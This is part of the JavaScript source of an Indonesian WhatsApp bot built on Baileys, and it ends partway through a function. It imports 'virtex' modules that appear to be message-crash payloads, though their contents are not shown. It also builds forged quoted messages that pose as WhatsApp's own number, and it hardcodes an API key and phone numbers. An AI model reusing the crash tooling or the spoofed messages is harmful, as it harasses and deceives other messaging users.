
const
	{
		WAConnection: _WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		WAMessageProto,
		ProxyAgent,
		ChatModification,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
		relayWAMessage,
		device,
		Browsers,
		DataView,
        TypedArray,
        RexdevectMode,
	} = require("@adiwajshing/baileys")
const hx = require('hxz-api')
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const util = require('util')
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const os = require('os')
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const { error } = require("qrcode-terminal")
const fromData = require('form-data')
const qrkode = require("qrcode")
const cheerio = require('cheerio')
const ggs = require('google-it')
//const base64Img = require('base64-img')



// stickwm
const Exif = require('./lib/exif');
const exif = new Exif();




 //******************* 》LIB FILE《 ********************\\
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color.js')
const { addCommands, checkCommands, deleteCommands } = require('./lib/commands')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { yta, ytv, igdl, upload, formatDate } = require('./lib/ytdl')
const { webp2mp4File} = require('./lib/webp2mp4')
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const voting = JSON.parse(fs.readFileSync('./lib/voting.json'))
const { addVote, delVote } = require('./lib/vote')
const { donasi, virtexp, help, help2, info1} = require('./message')
const { msgFilter } = require('./lib/antispam')
const { uploadimg } = require('./lib/uploadimg')
const { recognize } = require('./lib/ocr')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const { webp2gifFile, igDownloader, TiktokDownloader } = require("./lib/gif.js")
const simple = require("./lib/simple.js");
const WAConnection = simple.WAConnection(_WAConnection)
const client = new WAConnection()
const reminder = require("./lib/reminder");
const { addBadword, delBadword, isKasar, addCountKasar, isCountKasar, delCountKasar } = require("./lib/badword.js");
const { addBanned, unBanned, BannedExpired, cekBannedUser } = require("./lib/banned");
const { buggc } = require('./lib/antibuggc.js')
const { antitroli } = require('./lib/antitroli.js')
const { jadibot, stopjadibot, listjadibot } = require("./lib/jadibot");
const { lirikLagu } = require('./lib/lirik.js')
const { wikiSearch } = require('./lib/wiki.js')
const { newsCnn } = require('./lib/cnn.js')




 //******************* 》VIRTEX FILE《 ********************\\
//virtex by tsukasa
const { virtex, virtag, philip, emoji1, emoji2, virtex2, virtex3, virtex4, virtex5, virtex8, virtex9, virtex10, virtex11, virtex12, slayer, ngazap, virtexbytsukasa } = require('./virtex/virtex.js')
const { virtex6 } = require('./virtex/virtex6.js')
const { virtex7 } = require('./virtex/virtex7.js')
const { antivirus } = require('./virtex/antivirus.js')
const { vipi } = require('./virtex/vipi.js')
//virtex by Official Dittaz
const { viper } = require('./virtex/viper.js')
const { viper2 } = require('./virtex/viper2.js')
const { viper3 } = require('./virtex/viper3.js')
const { viper4 } = require('./virtex/viper4.js')
//virtex by davizinmaker
const{ tdm1, tdm2, tdm3, tdm4, tdm5, tdm6, tdm7, tdm8, tdm9, tdm10, tdm11, tdm12, tdm13, tdm14} = require('./virtex/virtex by tdm.js')

           






 //******************* 》JSON FILE《 ********************\\
let _scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
let antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
let antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'))
let commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
let setiker = JSON.parse(fs.readFileSync('./temp/stick.json'))
let audionye = JSON.parse(fs.readFileSync('./temp/vn.json'))
let musiknye = JSON.parse(fs.readFileSync('./temp/music.json'))
let imagenye = JSON.parse(fs.readFileSync('./temp/image.json'))
let videonye = JSON.parse(fs.readFileSync('./temp/video.json'))
let bancht = JSON.parse(fs.readFileSync('./database/banchat.json'))
let spamkuyy = JSON.parse(fs.readFileSync('./database/spam.json'))
let grupbadword = JSON.parse(fs.readFileSync('./database/grupbadword.json'));
let senbadword = JSON.parse(fs.readFileSync('./database/senbadword.json'));
const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
const badword = JSON.parse(fs.readFileSync('./database/badword.json'))
const salam = JSON.parse(fs.readFileSync('./database/salam.json'))
const bad = JSON.parse(fs.readFileSync('./database/bad.json'))
const menu = JSON.parse(fs.readFileSync('./database/menu.json'))
const warmode = JSON.parse(fs.readFileSync('./database/warmode.json'))
const mute = JSON.parse(fs.readFileSync('./database/mute.json'))
const _reminder = JSON.parse(fs.readFileSync("./database/reminder.json"));
const antihidetg = JSON.parse(fs.readFileSync("./database/antihidetag.json"));
const antivo = JSON.parse(fs.readFileSync("./database/antivo.json"));
const kickarea = JSON.parse(fs.readFileSync("./database/antibule.json"));
const badud = JSON.parse(fs.readFileSync("./database/bot.json"));
const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
const asapan = JSON.parse(fs.readFileSync('./database/asupan.json'))
const admin = JSON.parse(fs.readFileSync('./database/admin.json'))
const thanks = JSON.parse(fs.readFileSync('./database/thanks.json'))
const simin = JSON.parse(fs.readFileSync('./database/simi.json'))
const ohayo = JSON.parse(fs.readFileSync('./database/ohayo.json'))
const ucap = JSON.parse(fs.readFileSync('./database/ucap.json'))
const antibug = JSON.parse(fs.readFileSync('./database/antibug.json'))
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const bucin = JSON.parse(fs.readFileSync('./database/bucin.json'))
const extream = JSON.parse(fs.readFileSync('./database/extream.json'))


 //******************* 》VOICE FILE《 ********************\\
 //Voice for toxic
const digay = fs.readFileSync('./media/kawai/badword/dia gay.mp3')
const dosapantek = fs.readFileSync('./media/kawai/badword/dosa pantek.mp3')
const heeh = fs.readFileSync('./media/kawai/badword/heeh.mp3')
const losemuaanjeng = fs.readFileSync('./media/kawai/badword/lo semua anjeng.mp3')
const oyanjing = fs.readFileSync('./media/kawai/badword/oy anjing.mp3')
//Voice for isCmd
const lagiberak = fs.readFileSync('./media/kawai/notfound/aku lagi berak.mp3')
const gada = fs.readFileSync('./media/kawai/notfound/ga da.mp3')
const gamau = fs.readFileSync('./media/kawai/notfound/ga mau.mp3')
const kagaada = fs.readFileSync('./media/kawai/notfound/kaga ada.mp3')
const ngomongapa = fs.readFileSync('./media/kawai/notfound/ngomong apaan sih.mp3')
const gakboleh = fs.readFileSync('./media/kawai/notfound/ga boleh.mp3')
//Voice for sapaan and panggilan
const asautegodaimase = fs.readFileSync('./media/kawai/asautegodaimas.mp3')
const ohayogodaimase = fs.readFileSync('./media/kawai/ohayo gosaimase.mp3')
const oohayo = fs.readFileSync('./media/kawai/ohayo.mp3')






 //******************* 》STICKER PACK《 ********************\\
const buaned = fs.readFileSync('./sticker/telah dibanned.webp')
const gaboleh = fs.readFileSync('./sticker/ga boleh.webp')
const spam1 = fs.readFileSync('./sticker/bentar dulu.webp')
const spam2 = fs.readFileSync('./sticker/jangan spam.webp')
const istigfar = fs.readFileSync('./sticker/istigfar.webp')
const hah = fs.readFileSync('./sticker/hah.webp')
const mintadong = fs.readFileSync('./sticker/minta dong.webp')
const tapiboong = fs.readFileSync('./sticker/tapi boong.webp')
const hanyaadmin = fs.readFileSync('./sticker/hanya admin.webp')
const jadiinadmin = fs.readFileSync('./sticker/jadiin admin.webp')
const oketunggu = fs.readFileSync('./sticker/oke tunggu.webp')
const done = fs.readFileSync('./sticker/done kak.webp')
const emror = fs.readFileSync('./sticker/error kak.webp')
const jotos = fs.readFileSync('./sticker/jotos nih.webp')
const jogetin = fs.readFileSync('./sticker/vn.webp')
const apaantuh = fs.readFileSync('./sticker/apaan tuh.webp')
const ucapsalam = fs.readFileSync('./sticker/ucapsalam.webp')
const samasama = fs.readFileSync('./sticker/sama sama.webp')
const kumsalam = fs.readFileSync('./sticker/salam.webp')
const ketikmenu = fs.readFileSync('./sticker/ketikmenu.webp')
const ngantuk = fs.readFileSync('./sticker/ngantuk.webp')
const zzz = fs.readFileSync('./sticker/zzz.webp')





 //******************* 》FILE PHOTO《 ********************\\
const virgam = fs.readFileSync('./stik/virgam.jpeg');
const sampah = fs.readFileSync('./stik/sampah.jpg');
const girl = fs.readFileSync('./stik/trava.jpg');
//Virgam by davizinmaker
const davizin = fs.readFileSync('./stik/davizinmaker.jpg')
const thumb = fs.readFileSync('./stik/thumb.jpeg')
const fakethumbnail = fs.readFileSync('./stik/fake.jpeg')






Antivo = false 
namalu = settings.namalu
publik = settings.publik
ephemeral = false
totalForward = settings.totalForward
prefa = settings.prefix
multi = settings.multi
forwarding = settings.forwarding
onepref  = settings.onepref
nopref = false
banChats = false
offline = false
typing= settings.typing
autoread = settings.autoread
autorespon = false
autovn = settings.autovn
antibugtroli = settings.antitroli
targetpc = '0'
nomerOwner = settings.nomer
fake = settings.namabot
fake1 = settings.namebot
numbernye = '0'
waktu = '-'
alasan = '-'
cmhit = []
listjadibot1 = [];
baterai = {
battery: "" || "Tidak Terdeteksi",
isCharge: "" || false
}
mati = false
jeda = false
wait = false
sendbug = false
teksChat = settings.teksChat
chatBot = settings.chatBot
gender = settings.gender
autosticker = settings.autosticker
kentod = settings.unregistercommand
spam = settings.spamtext




 //******************* 》API KEY《 ********************\\
lolKey = settings.lolkey
zeks = settings.zeks
xteam = settings.xteam
apikey ='3a5fadc9dfb7b4b1f2a5a8e3' // lol human


const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    _scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return _scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            status = true
        }
    })
    return status
}


const addBuanned = (userId, _data) => {
    const obj = {
      id : userId
    }
    ban.push(obj)
    fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
    return true
}



const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat malam'
                                        }
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat malam'
                                         }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat sore'
                                         }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat siang'
                                         }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat pagi'
                                         }
if(time2 < "06:00:00"){
var ucapanWaktu = 'Selamat pagi'  }






 let d = new Date
				let locale = 'id'
				let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
				let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
				let week = d.toLocaleDateString(locale, { weekday: 'long' })
				let calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
				})







//=================================================//
module.exports = xdev = async (xdev, dev) => {
	try {
        if (!dev.hasNewMessage) return 
        dev = dev.messages.all()[0]
		if (!dev.message) return
		Ownerin =["6285156137901@s.whatsapp.net"]
		ownerNumber = ["6285156137901@s.whatsapp.net",`${nomerOwner}@s.whatsapp.net`]
		if (dev.key && dev.key.remoteJid == 'status@broadcast') return
		const m = simple.smsg(xdev, dev);
		const senderr = m.sender.split`@`[0]
		const cot = dev.key.fromMe ? xdev.user.jid : xdev.contacts[dev.key.fromMe ? xdev.user.jid : dev.key.remoteJid.endsWith('@g.us') ? dev.participant : dev.key.remoteJid] || { notify: jid.replace(/@.+/, '') }
        const pushnem = dev.key.fromMe ? xdev.user.name : cot.notify || cot.vname || cot.name || '-'
        const sent = dev.key.fromMe ? xdev.user.jid : dev.key.remoteJid.endsWith('@g.us') ? dev.participant : dev.key.remoteJid
		const theOwner = Ownerin.includes(sent)
		const isowner = ownerNumber.includes(sent)
		const metaData = dev.key.remoteJid.endsWith('@g.us')  ? await xdev.groupMetadata(dev.key.remoteJid) : ''
		const memberGroup = dev.key.remoteJid.endsWith('@g.us')  ? metaData.participants : ''
		const botAdmins = dev.key.remoteJid.endsWith('@g.us') ? getGroupAdmins(memberGroup) : ''
		const adminGroup = botAdmins.includes(sent) || false
		const temenAdmin = admin.includes(sent)
		const isBotAdmins = botAdmins.includes(xdev.user.jid) || false
		const Antibuggc = dev.key.remoteJid.endsWith('@g.us')  ? antibug.includes(dev.key.remoteJid) : false
		if(mati === true){
        if(!theOwner) return
         }
		
	     //Antibuggc edited by official dittaz, thanks to Mbb, Memans and Manik
	    if(Antibuggc && dev.key.remoteJid.endsWith('@g.us')){
	    if(Object.keys(dev.message)[0] === 'ephemeralMessage' && JSON.stringify(dev.message).includes('EPHEMERAL_SETTING') && dev.message.ephemeralMessage.message.protocolMessage.type === 3){ 
		if(temenAdmin) return
		if(adminGroup) return xdev.sendMessage(dev.key.remoteJid, 'Admin grup mah bebas main buggc yekan 😎🤣', MessageType.text)
	    if(isowner) return xdev.sendMessage(dev.key.remoteJid, 'Owner mah bebas ngebug yekan 😎🤣', MessageType.text)
        xdev.sendMessage(dev.key.remoteJid, buggc(senderr,pushnem), MessageType.text)
        if(!isBotAdmins) return 
        if(jeda === true) return
        jeda = true
      await xdev.groupRemove(dev.key.remoteJid, [sent]);
      jeda = false
		}
		}
		
		
        
        dev.message = (Object.keys(dev.message)[0] === 'ephemeralMessage') ? dev.message.ephemeralMessage.message : dev.message
        const typei = Object.keys(dev.message)[0]
        global.prefix
        me = xdev.user
        const antibot = m.isBaileys
        const content = JSON.stringify(dev.message)
		const from = dev.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const type = Object.keys(dev.message)[0]        
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const cmd = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
        var pes = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : ''
        const messagesC = pes.slice(0).trim()
        
     
         if (multi){
		 var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
        } else {
        if (nopref){
         prefix = " "
         } else {
          prefix = prefa
         }
         }  
        //body = (type === 'conversation' && dev.message.conversation.startsWith(prefix)) ? dev.message.conversation : (type == 'imageMessage') && dev.message[type].caption.startsWith(prefix) ? dev.message[type].caption : (type == 'videoMessage') && dev.message[type].caption.startsWith(prefix) ? dev.message[type].caption : (type == 'extendedTextMessage') && dev.message[type].text.startsWith(prefix) ? dev.message[type].text : (type == 'listResponseMessage') && dev.message[type].singleSelectReply.selectedRowId ? dev.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && dev.message[type].selectedButtonId ? dev.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(dev.message[type].fileSha256.toString('base64')) !== null && getCmd(dev.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message[type].fileSha256.toString('base64')) : ""
        body = (type === 'listResponseMessage' && dev.message.listResponseMessage.title) ? dev.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && dev.message.buttonsResponseMessage.selectedButtonId) ? dev.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && dev.message.conversation.startsWith(prefix)) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption.startsWith(prefix) ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption.startsWith(prefix) ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text.startsWith(prefix) ? dev.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(dev.message.stickerMessage.fileSha256.toString('base64')) : ""
        budo = (typei === 'conversation') ? dev.message.conversation : (typei === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
		budy = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
        button = (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedDisplayText : ''
        isImage = (type === 'imageMessage')
        listmes = (type == 'listResponseMessage') ? dev.message.listResponseMessage.title : ''
       
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
        const c = args.join(" ")
		const timeWib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
		const timeWit= moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
        const timeWita = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
		const botNumber = xdev.user.jid
		const botNumberss = xdev.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = dev.key.fromMe ? xdev.user.jid : isGroup ? dev.participant : dev.key.remoteJid
		const senderNumber = sender.split("@")[0] 
		const isOwner = ownerNumber.includes(sender)
		const isAdmin = admin.includes(sender)
		const totalchat = await xdev.chats.all()
		const groupMetadata = isGroup ? await xdev.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
        const conts = dev.key.fromMe ? xdev.user.jid : xdev.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = dev.key.fromMe ? xdev.user.name : conts.notify || conts.vname || conts.name || '-'
        chatss = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
        const forward = { forwardingScore: totalForward, isForwarded: forwarding, sendEphemeral: ephemeral}
        const tescuk = ["0@s.whatsapp.net"]
        const isSpammerr = spamkuyy.includes(sender)
        const isBanned = ban.includes(sender)
        const timestampp = speed();
	    const latensi = speed() - timestampp
        const arg = budy.slice(command.length + 2, budy.length)
        const atibot = dev.isBaileys
        const sengirim = m.sender.split`@`[0]
        
   















        
        
        
  
        
 //******************* 》ACTIVATED SECURITY《 ********************\\
        const Toxic = isGroup ? grupbadword.includes(from) : false
        const isBanchat = isGroup ? bancht.includes(from) : false
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
        const isVote = isGroup ? voting.includes(from) : false
        const isAntiLink = isGroup ? antilink.includes(from) : false
        const AntiVirtex = isGroup ? antivirtex.includes(from) : false
        const isWarmode = isOwner ? warmode.includes(from) : false
        const isMuted = isGroup ? mute.includes(from) : false
        const isAntihidetag = isGroup ? antihidetg.includes(from) : false;
        const isAntiviewonce = isGroup ? antivo.includes(from) : false;
        const isKickarea = isGroup ? kickarea.includes(from) : false;
        const isWelkom = isGroup ? welkom.includes(from) : false
        const isExtream = isGroup ? extream.includes(from) : false
        const isSimi = simin.includes(from)
        
        
       
// MUTE
if (isMuted ){
            if (!isOwner && !theOwner) return
}

 //BAN CHAT
if (isBanchat){
if (!isOwner && !theOwner) return
}






cmhit.push(command)


  


 //******************* 》MESSGAGE RESPON《 ********************\\
		mess = {
			banned: 'anda telah dibanned 😎',
			wait: '_Tunggu sebentar ya kak_',
			admin: '_Kusus admin_',
			owner: '_Kusus owner_',
			success: 'Berhasil!',
			wrongFormat: 'Format salah, coba liat lagi di menu',
			error: {
				stick: 'bukan sticker itu:v',
				Iv: 'Linknya error:v'
			},
			only: {
				group: 'Khusus grup ngab',
			}
		}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }
        
        
        
        
        
        
        
        
        
 //******************* 》FAKE REPLY《 ********************\\
   
        //FAKEREPLY PRODUCT
            const ftoko = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./stik/thumb.jpeg`)},"title": `hola`,"description": `「 audio 」 `, "retailerId": `「 audio 」 `,"productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
            //FAKE KONTAK
            const fkontak = { 
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKE STICKER
            const fsticker = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},"message": {"stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc","fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=","fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=","mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73","fileLength": "7186","mediaKeyTimestamp": "1622815545","isAnimated": false}}}
            //FAKE VN
            const fvn = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds": "9999999","ptt": "true"}}}
            //FAKE TEXT
            const ftext = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKE LIVE ACTION
            const floc2 = {
                  key: {"fromMe": false,"participant": `0@s.whatsapp.net`, "remoteJid": "6289530863358-1621036495@g.us" },message: { "liveLocationMessage": { "title":`${fake}`,}}}
            //FAKEREPLY TROLI
            const ftroli = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 2021,status: 1,surface : 2,message: `${fake}`,orderTitle: 'Bang',thumbnail: fs.readFileSync('./stik/thumb.jpeg'), sellerJid: '0@s.whatsapp.net'}}}
            //FAKEREPLY VIDEO
            const fvideo = {
                  key: {fromMe: false,participant: `62895619083555@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '-99999', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKEREPLY GROUPINVITE
            const fgc = {
                  key: {"fromMe": false,"participant": "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "62895619083555-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "P", "caption": `${fake}`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKEREPLY GIF
            const fgif = {
                  key: {fromMe: false,participant: `6285842369183@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}} 
            //FAKEREPLY menu
            
            
            
            const fmenu = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: from  } : {}) }, message: { conversation: fake}}
                //FAKEREPLY menu1
            const fmenu1 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": fake, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 416, "width": 416, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": thumb}}}
               //FAKEREPLY musik
       const sendKontak = (from, nomor, nama, org = "") => {
      const vcard =
        "BEGIN:VCARD\n" +
        "VERSION:3.0\n" +
        "FN:" +
        nama +
        "\n" +
        "ORG:" +
        org +
        "\n" +
        "TEL;type=CELL;type=VOICE;waid=" +
        nomor +
        ":+" +
        nomor +
        "\n" +
        "END:VCARD";
      xdev.sendMessage(
        from,
        { displayname: nama, vcard: vcard },
        MessageType.contact,
        { quoted: dev }
      );
    };


   







//******************* 》BUTTON CMD《 ********************\\
  
///Button Text
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
xdev.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await xdev.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await xdev.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await xdev.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
xdev.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}










//******************* 》FAKE MESSAGE《 ********************\\

        const sendFakeStatus = (from, teks, faketeks) => {   
			 xdev.sendMessage(from, teks, text, { quoted: { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake1}`,"title": `Hmm`,'jpegThumbnail': sampah}}}})
          } 
             
        const sendAudio = (teks) => {
                    xdev.sendMessage(from, teks, audio, {mimetype: 'audio/mp4', quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 2021,status: 1,surface : 2,message: `🆔「 ${pushname} 」\n🎵 ${responseButton}`,orderTitle: 'Bang',thumbnail: fs.readFileSync('./stik/fake2.jpeg'), sellerJid: '0@s.whatsapp.net'}}}, ptt: true, contextInfo: forward})
         } 
         const sendvn = (teks) => {
